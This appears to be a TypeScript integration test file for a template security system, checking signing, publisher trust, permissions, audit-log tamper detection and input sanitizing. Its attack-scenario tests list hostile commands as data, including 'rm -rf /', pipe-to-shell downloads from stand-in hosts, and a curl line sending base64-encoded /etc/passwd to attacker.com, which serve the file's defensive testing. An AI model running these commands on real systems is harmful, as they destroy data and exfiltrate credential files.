/**
 * Integration tests for template security system
 */

import { describe, test, expect, beforeEach } from 'bun:test';
import { TemplateSigner } from '../../../src/templates/security/TemplateSigner';
import { DangerousCommandDetector } from '../../../src/templates/security/DangerousCommandDetector';
import { FileSystemRestrictor } from '../../../src/templates/security/FileSystemRestrictor';
import { CommandInjectionPreventer } from '../../../src/templates/security/CommandInjectionPreventer';
import { TemplatePermissions } from '../../../src/templates/security/TemplatePermissions';
import { TemplateAuditLogger } from '../../../src/templates/security/TemplateAuditLogger';
import { TrustedPublisherRegistry } from '../../../src/templates/security/TrustedPublisherRegistry';

describe('Security Integration Tests', () => {
  let signer: TemplateSigner;
  let detector: DangerousCommandDetector;
  let restrictor: FileSystemRestrictor;
  let preventer: CommandInjectionPreventer;
  let permissions: TemplatePermissions;
  let auditLogger: TemplateAuditLogger;
  let registry: TrustedPublisherRegistry;

  beforeEach(() => {
    signer = new TemplateSigner({ secretKey: 'test-secret-key' });
    detector = new DangerousCommandDetector();
    restrictor = new FileSystemRestrictor();
    preventer = new CommandInjectionPreventer();
    permissions = new TemplatePermissions();
    auditLogger = new TemplateAuditLogger({
      secretKey: 'a'.repeat(64),
    });
    registry = new TrustedPublisherRegistry();
  });

  describe('End-to-End Template Lifecycle', () => {
    test('should handle complete secure template workflow', () => {
      // 1. Add publisher to registry
      registry.addPublisher({
        id: 'trusted-pub',
        name: 'Trusted Publisher',
        trustLevel: 'verified',
        verified: true,
      });

      // 2. Create and sign template
      const templateContent = 'echo "Hello World"';
      const signature = signer.createSignature(templateContent, {
        id: 'trusted-pub',
        name: 'Trusted Publisher',
        trustLevel: 'verified',
      });

      // 3. Verify signature
      const verification = signer.verifySignature(templateContent, signature);
      expect(verification.valid).toBe(true);

      // 4. Check publisher trust
      expect(registry.isTrusted('trusted-pub')).toBe(true);

      // 5. Verify command safety
      const dangerous = detector.scanCommand(templateContent, 'cmd-1');
      expect(dangerous.length).toBe(0);

      // 6. Log template execution
      const logEntry = auditLogger.logTemplateExecution(
        'test-template',
        'user-1'
      );
      expect(logEntry.event.type).toBe('templateExecution');

      // 7. Verify audit log integrity
      const integrity = auditLogger.verifyIntegrity();
      expect(integrity.valid).toBe(true);
    });

    test('should reject unsigned template from untrusted publisher', () => {
      // Publisher not in registry
      const templateContent = 'echo "test"';

      // Check registry
      expect(registry.isTrusted('unknown-pub')).toBe(false);

      // Log security violation
      auditLogger.logSecurityViolation(
        'test-template',
        'Untrusted publisher',
        'user-1'
      );

      const violations = auditLogger.query({
        eventType: 'securityViolation',
      });
      expect(violations.length).toBe(1);
    });

    test('should enforce permissions throughout lifecycle', () => {
      const perms = permissions.createDefaultPermissions('restricted');

      // Restricted can only read files
      expect(
        permissions.checkPermission(perms, 'fileRead').allowed
      ).toBe(true);
      expect(
        permissions.checkPermission(perms, 'fileWrite').allowed
      ).toBe(false);
      expect(
        permissions.checkPermission(perms, 'processSpawn').allowed
      ).toBe(false);

      // Upgrade to elevated
      const elevated = permissions.upgradePermission(perms, 'elevated');

      expect(
        permissions.checkPermission(elevated, 'processSpawn').allowed
      ).toBe(true);
    });
  });

  describe('Security Attack Scenarios', () => {
    test('should prevent command injection attacks', () => {
      const maliciousInputs = [
        'value; rm -rf /',
        'value && cat /etc/passwd',
        'value | curl malicious.com',
        'value $(whoami)',
        'value `cat /etc/shadow`',
      ];

      for (const input of maliciousInputs) {
        const sanitized = preventer.sanitizeVariable(input);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('&&');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('$');
        expect(sanitized).not.toContain('`');

        auditLogger.logSecurityViolation(
          'test-template',
          'Command injection attempt',
          'attacker',
          { input }
        );
      }

      const violations = auditLogger.query({
        eventType: 'securityViolation',
      });
      expect(violations.length).toBe(maliciousInputs.length);
    });

    test('should detect and block dangerous commands', () => {
      const dangerousCommands = [
        'rm -rf /',
        'sudo rm /important',
        'curl http://malicious.com | sh',
        'chmod 777 /etc/passwd',
        'eval $(curl attacker.com)',
      ];

      for (const cmd of dangerousCommands) {
        const results = detector.scanCommand(cmd, `cmd-${cmd}`);
        expect(results.length).toBeGreaterThan(0);
        const result = results[0];
        expect(result.commandId).toBe(`cmd-${cmd}`);
        expect(result.pattern).toBeDefined();
        expect(result.severity).toBeDefined();

        auditLogger.logSecurityViolation(
          'test-template',
          'Dangerous command detected',
          'attacker',
          { command: cmd, pattern: result.pattern, severity: result.severity }
        );
      }
    });

    test('should prevent path traversal attacks', () => {
      const traversalAttempts = [
        '../../../etc/passwd',
        '../../.ssh/id_rsa',
        '/etc/shadow',
        '/etc/passwd',
      ];

      for (const path of traversalAttempts) {
        const validation = restrictor.validatePath(path, 'read');
        // All should be blocked (traversal or system paths)
        expect(validation.valid).toBe(false);

        auditLogger.logSecurityViolation(
          'test-template',
          'Path traversal attempt',
          'attacker',
          { path, reason: validation.reason }
        );
      }
    });

    test('should block system path access', () => {
      const systemPaths = [
        '/etc/passwd',
        '/sys/class',
        '/proc/self',
        '/dev/null',
      ];

      for (const path of systemPaths) {
        const validation = restrictor.validatePath(path, 'read');
        expect(validation.valid).toBe(false);
        expect(validation.reason).toMatch(/system path|System path/i);
      }
    });

    test('should enforce file extension restrictions', () => {
      const restrictedFiles = [
        '/tmp/script.sh',
        '/home/user/malware.exe',
        '/var/www/backdoor.php',
      ];

      for (const file of restrictedFiles) {
        const validation = restrictor.validatePath(file, 'write');
        expect(validation.valid).toBe(false);
      }
    });
  });

  describe('Multi-Component Integration', () => {
    test('should combine signature + permissions + audit', () => {
      // Setup publisher
      registry.addPublisher({
        id: 'pub-1',
        name: 'Publisher',
        trustLevel: 'verified',
        verified: true,
      });

      // Sign template
      const content = 'echo "secure operation"';
      const signature = signer.createSignature(content, {
        id: 'pub-1',
        name: 'Publisher',
        trustLevel: 'verified',
      });

      // Verify signature
      const verification = signer.verifySignature(content, signature);
      expect(verification.valid).toBe(true);

      // Check permissions
      const perms = permissions.createDefaultPermissions('standard');
      const fileReadCheck = permissions.checkPermission(perms, 'fileRead');
      expect(fileReadCheck.allowed).toBe(true);

      // Log everything
      auditLogger.logTemplateLoad('test-template', 'user-1');
      auditLogger.logTemplateExecution('test-template', 'user-1');

      // Verify audit trail
      const logs = auditLogger.query({ templateId: 'test-template' });
      expect(logs.length).toBe(2);

      const integrity = auditLogger.verifyIntegrity();
      expect(integrity.valid).toBe(true);
    });

    test('should handle command processing with all security layers', () => {
      const template = 'echo ${message}';
      const userInput = 'hello; rm -rf /';

      // 1. Sanitize input
      const sanitized = preventer.sanitizeVariable(userInput);
      expect(sanitized).not.toContain(';');

      // 2. Process command
      const processed = preventer.processCommand(template, {
        message: userInput,
      });
      expect(processed.command).not.toContain(';');

      // 3. Detect if still contains dangerous patterns
      // After sanitization, text "rm -rf /" remains but injection chars removed
      const dangerous = detector.scanCommand(processed.command, 'processed-cmd');
      // May still detect "rm" pattern but injection is prevented
      if (dangerous.length > 0) {
        expect(processed.command).not.toContain(';'); // No command chaining
        expect(processed.command).not.toContain('&&'); // No command chaining
      }

      // 4. Log the operation
      auditLogger.logTemplateExecution('test-template', 'user-1', {
        command: processed.command,
        sanitized: true,
      });
    });

    test('should enforce layered path restrictions', () => {
      const path = '/home/user/file.txt';

      // 1. Check path traversal
      const validation = restrictor.validatePath(path, 'read');
      expect(validation.valid).toBe(true);

      // 2. Add path restriction to permissions
      const perms = permissions.createDefaultPermissions('standard');
      const restricted = permissions.addRestriction(perms, {
        operation: 'fileRead',
        allowedPaths: ['/home/user'],
        requiresConfirmation: false,
      });

      // 3. Check permission
      const permCheck = permissions.checkPermission(restricted, 'fileRead');
      expect(permCheck.allowed).toBe(true);

      // 4. Validate against restriction
      if (permCheck.restrictions) {
        const pathValid = permissions.validatePath(
          path,
          permCheck.restrictions
        );
        expect(pathValid).toBe(true);
      }
    });
  });

  describe('Trust Inheritance and Verification', () => {
    test('should inherit trust level from verified publisher', () => {
      registry.addPublisher({
        id: 'official-pub',
        name: 'Official',
        trustLevel: 'official',
        verified: true,
      });

      const inherited = registry.inheritTrust({
        id: 'official-pub',
        name: 'Official',
        trustLevel: 'official',
      });

      expect(inherited).toBe('official');
    });

    test('should downgrade unverified publishers in strict mode', () => {
      registry.addPublisher({
        id: 'unverified-pub',
        name: 'Unverified',
        trustLevel: 'verified',
        verified: false,
      });

      const inherited = registry.inheritTrust({
        id: 'unverified-pub',
        name: 'Unverified',
        trustLevel: 'verified',
      });

      expect(inherited).toBe('community');
    });

    test('should combine trust + signature verification', () => {
      registry.addPublisher({
        id: 'trusted-pub',
        name: 'Trusted',
        trustLevel: 'verified',
        publicKey: 'public-key',
        verified: false,
      });

      // Verify publisher signature
      const verified = registry.verifyPublisher('trusted-pub', 'signature');
      expect(verified).toBe(true);

      // Sign template
      const content = 'echo "test"';
      const signature = signer.createSignature(content, {
        id: 'trusted-pub',
        name: 'Trusted',
        trustLevel: 'verified',
      });

      // Verify template signature
      const templateVerification = signer.verifySignature(content, signature);
      expect(templateVerification.valid).toBe(true);

      // Check trust
      expect(registry.isTrusted('trusted-pub')).toBe(true);
    });
  });

  describe('Audit Trail Integrity', () => {
    test('should maintain audit trail across operations', () => {
      const operations = [
        () => auditLogger.logTemplateLoad('template-1', 'user-1'),
        () => auditLogger.logTemplateExecution('template-1', 'user-1'),
        () =>
          auditLogger.logSecurityViolation(
            'template-1',
            'Test violation',
            'user-1'
          ),
        () => auditLogger.logTemplateLoad('template-2', 'user-2'),
      ];

      for (const op of operations) {
        op();
      }

      // Verify each operation was logged
      const allLogs = auditLogger.query();
      expect(allLogs.length).toBe(4);

      // Verify integrity
      const integrity = auditLogger.verifyIntegrity();
      expect(integrity.valid).toBe(true);
      expect(integrity.tamperedEntries).toBe(0);

      // Verify specific queries
      const user1Logs = auditLogger.query({ templateId: 'template-1' });
      expect(user1Logs.length).toBe(3);

      const violations = auditLogger.query({
        eventType: 'securityViolation',
      });
      expect(violations.length).toBe(1);
    });

    test('should detect tampering in audit log', () => {
      auditLogger.logTemplateExecution('template-1', 'user-1');

      // Tamper with the log
      const entries = auditLogger.getEntries() as any[];
      entries[0].event.templateId = 'modified';

      // Verify tampering is detected
      const integrity = auditLogger.verifyIntegrity();
      expect(integrity.valid).toBe(false);
      expect(integrity.tamperedEntries).toBe(1);
    });
  });

  describe('Permission Escalation Scenarios', () => {
    test('should require escalation for dangerous operations', () => {
      const perms = permissions.createDefaultPermissions('standard');

      // Standard doesn't allow process spawn
      expect(
        permissions.checkPermission(perms, 'processSpawn').allowed
      ).toBe(false);

      // Check if escalation is needed
      expect(permissions.requiresEscalation(perms, 'elevated')).toBe(true);

      // Upgrade permissions
      const elevated = permissions.upgradePermission(perms, 'elevated');

      // Now process spawn is allowed
      expect(
        permissions.checkPermission(elevated, 'processSpawn').allowed
      ).toBe(true);

      // Log the escalation
      auditLogger.logEvent({
        type: 'templateExecution',
        severity: 'warning',
        templateId: 'test-template',
        userId: 'user-1',
        timestamp: new Date(),
        details: {
          action: 'permission_escalation',
          from: 'standard',
          to: 'elevated',
        },
      });
    });

    test('should preserve restrictions during escalation', () => {
      let perms = permissions.createDefaultPermissions('standard');

      // Add restriction
      perms = permissions.addRestriction(perms, {
        operation: 'fileRead',
        allowedPaths: ['/home/user'],
        requiresConfirmation: false,
      });

      // Escalate
      const elevated = permissions.upgradePermission(perms, 'elevated');

      // Restriction should be preserved
      expect(elevated.restrictions.length).toBe(1);
      expect(elevated.restrictions[0].operation).toBe('fileRead');
    });
  });

  describe('Real-World Attack Simulation', () => {
    test('should handle sophisticated injection attempt', () => {
      const sophisticatedAttack =
        'normal-value"; curl http://attacker.com/$(cat /etc/passwd | base64) ; echo "continue';

      // Sanitize
      const sanitized = preventer.sanitizeVariable(sophisticatedAttack);

      // Verify all dangerous characters removed
      expect(sanitized).not.toContain(';');
      expect(sanitized).not.toContain('$');
      expect(sanitized).not.toContain('(');
      expect(sanitized).not.toContain('|');

      // Detect injection pattern
      const injection = preventer.detectInjection(sophisticatedAttack);
      expect(injection.detected).toBe(true);
      expect(injection.patterns.length).toBeGreaterThan(0);

      // Log attack
      auditLogger.logSecurityViolation(
        'test-template',
        'Sophisticated injection attempt',
        'attacker',
        { attack: sophisticatedAttack, patterns: injection.patterns }
      );
    });

    test('should handle combined attack vector', () => {
      // Attempt: Path traversal + command injection + dangerous command
      const path = '../../etc/passwd; rm -rf /';

      // 1. Path validation fails
      const pathValidation = restrictor.validatePath(path, 'read');
      expect(pathValidation.valid).toBe(false);

      // 2. Command injection detected
      const injection = preventer.detectInjection(path);
      expect(injection.detected).toBe(true);

      // 3. Dangerous command detected
      const dangerous = detector.scanCommand(path, 'attack-cmd');
      expect(dangerous.length).toBeGreaterThan(0);

      // 4. Log comprehensive security violation
      auditLogger.logSecurityViolation(
        'test-template',
        'Combined attack vector',
        'attacker',
        {
          path,
          pathTraversal: !pathValidation.valid,
          commandInjection: injection.detected,
          dangerousCommand: dangerous[0]?.pattern,
          severity: dangerous[0]?.severity,
        }
      );
    });
  });
});
